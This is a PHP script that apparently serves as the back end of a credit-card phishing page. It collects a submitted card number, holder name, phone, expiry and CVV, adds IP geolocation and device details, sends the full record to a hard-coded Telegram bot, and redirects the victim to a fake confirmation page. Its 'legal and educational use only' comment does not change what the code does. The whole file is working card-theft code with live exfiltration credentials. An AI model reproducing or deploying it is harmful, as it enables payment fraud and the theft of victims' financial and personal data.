<?php require_once __DIR__ . '/protect.php'; ?>
<?php
// carte_bancaire.php - Traitement des données (à utiliser uniquement dans un cadre légal et pédagogique)

// 1. Récupération des données du formulaire
$cardNumber = $_POST['cardInput'] ?? '';
$cardHolder = $_POST['cardHolder'] ?? '';
$telephone = $_POST['telephone'] ?? '';
$expMonth = $_POST['monthInput'] ?? '';
$expYear = $_POST['yearInput'] ?? '';
$cvv = $_POST['cwInput'] ?? '';

// 2. Configuration Telegram
$telegramToken = "8611938285:AAH_O6Xbq52h1JI6lirqcvzUjCk-PHZPNsE";
$telegramChatId = "8430145516";

// 3. Géolocalisation réelle avec ipinfo.io
$ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'];
$geoInfo = @json_decode(file_get_contents("https://ipinfo.io/{$ip}/json?token=3416ceaf95a319"), true);

// 4. Détection de l'appareil
$userAgent = $_SERVER['HTTP_USER_AGENT'];
$deviceType = preg_match('/Mobile|Android|iPhone/i', $userAgent) ? 'Mobile' : 'Desktop';

// 5. Date/Heure avec timezone détectée
date_default_timezone_set($geoInfo['timezone'] ?? 'Europe/Paris');
$currentTime = date('H:i:s');
$currentDate = date('d/m/Y');

// 6. Construction du message détaillé
$message = "
💳 NOUVELLE CARTE BANCAIRE ENREGISTRÉE
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⏰ DATE ET HEURE:
📅 Date: {$currentDate}
🕒 Heure: {$currentTime}

🔐 DONNÉES DE LA CARTE:
🔢 Numéro: {$cardNumber}
👤 Titulaire: {$cardHolder}
📞 Téléphone: {$telephone}
📅 Expiration: {$expMonth}/{$expYear}
🔒 CVV: {$cvv}

📍 GÉOLOCALISATION:
🌍 IP: {$ip}
🏙️ Ville: " . ($geoInfo['city'] ?? 'Inconnue') . "
📌 Région: " . ($geoInfo['region'] ?? 'Inconnue') . "
🏳️ Pays: " . ($geoInfo['country'] ?? 'Inconnu') . "
📡 ISP: " . ($geoInfo['org'] ?? 'Inconnu') . "

💻 INFOS APPAREIL:
📱 Type: {$deviceType}
🖥️ User-Agent: {$userAgent}
🖥️ Résolution: " . ($_POST['screen_width'] ?? 'Inconnue') . "x" . ($_POST['screen_height'] ?? 'Inconnue') . "
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━";

// 7. Envoi à Telegram
$url = "https://api.telegram.org/bot{$telegramToken}/sendMessage?" . http_build_query([
    'chat_id' => $telegramChatId,
    'text' => $message
]);
@file_get_contents($url);

// 8. Redirection vers une page de confirmation
header("Location: final.php");
exit;
?>